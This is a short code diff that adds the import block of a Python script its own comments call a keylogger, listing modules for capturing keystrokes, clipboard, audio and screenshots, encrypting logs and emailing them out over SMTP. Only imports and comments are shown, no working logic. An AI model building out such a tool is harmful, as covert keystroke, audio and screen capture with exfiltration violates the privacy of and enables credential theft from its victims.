@@ -11,6 +11,40 @@ By
                                                                  .88
                                                              d8888P                     
 '''
+# Required Libraries for the keylogger 
 
 
+
+# Sending the log files to the email 
+from email.mime.multipart import MIMEMultipart 
+from email.mime.text import MIMEText 
+from email.mime.base import MIMEBase 
+from email import encoders
+
+
+# Establishing connection with smtp service 
+import smtplib 
+import socket 
+import platform 
+
+# Getting Keystores 
+# import win32clipboard 
+from pynput.keyboard import Key,Listener 
+
+# Getting Time of the Event 
+import time 
+import os 
+
+# Recording Audio (Creep Alert!!)
+from scipy.io.wavfile import write 
+import sounddevice as sd 
+
+# Encryption 
+from cryptography.fernet import Fernet 
+import getpass 
+from requests import get 
+
+# Getting Screenshots (Again Creep Alert!!) 
+from multiprocessing import Process,freeze_support 
+from PIL import ImageGrab
 
